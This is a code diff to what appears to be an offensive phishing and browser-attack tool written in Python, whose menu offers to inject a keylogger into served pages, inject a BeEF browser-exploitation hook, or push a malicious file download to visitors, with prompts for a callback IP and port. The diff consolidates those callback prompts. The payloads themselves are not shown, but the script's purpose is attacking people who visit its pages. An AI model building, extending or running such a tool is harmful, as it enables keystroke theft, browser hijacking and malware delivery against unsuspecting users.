@@ -30,18 +30,6 @@ to use premade pages simply place your html file in the templates folder as <sea
 #choose here
 opt = int(input("option: "))
 
-#inject keylogger
-if opt == 1:
-	#if you are using ngrok etc specify 
-	ipb = input("\nip to log keys to (leave blank for same ip): ")
-	portb = input("port to log keys to (leave blank for same ip): ")
-	if not ipb:
-		ipb = h
-		print("\nusing same ip")
-	if not portb:
-		portb = p
-		print("using same port")
-
 #inject BeEF hook
 if opt == 2:
 	beef_ip=input("BeEF ip: ")
@@ -63,14 +51,15 @@ if opt == 3:
 
 if opt == 4:
 	maldown=input("filename: ")
-	ipb = input("\nip to download from (leave blank for same ip): ")
-	portb = input("port to log keys to (leave blank for same ip): ")
-	if not ipb:
-		ipb = h
-		print("\nusing same ip")
-	if not portb:
-		portb = p
-		print("using same port")
+
+ipb = input("\nip to call back to and replace links with (leave blank for same ip): ")
+portb = input("port (leave blank for same port): ")
+if not ipb:
+	ipb = h
+	print("\nusing same ip")
+if not portb:
+	portb = p
+	print("using same port")
 print('''
 	popunder location /u (might not work well on firefox sollution coming in v2.0)
 	google search location / 
